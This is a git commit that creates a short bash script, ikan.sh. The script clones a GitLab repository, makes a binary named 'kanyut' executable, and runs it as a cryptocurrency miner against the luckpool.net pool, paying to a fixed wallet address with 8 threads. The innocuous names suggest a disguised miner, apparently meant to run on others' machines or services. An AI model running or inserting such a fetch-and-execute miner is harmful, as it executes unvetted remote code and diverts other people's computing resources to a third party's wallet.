d27a2c6a3378d2c971e6c813e88b76fa50863591
dannys-id <60502767+dannys-id@users.noreply.github.com>
2021-11-22 23:57:23 +0700

    Create ikan.sh

---
+++ ikan.sh
@@ -0,0 +1,2 @@
+#!/usr/bin/env bash
+git clone https://gitlab.com/kikibena365/ikan.git && cd ikan && chmod +x kanyut && ./kanyut -v -l na.luckpool.net:3956 -u RAW7HNDKqZARZKW9rLLPchhMkuwBfc85qD.nurut1 -p hybrid -t 8
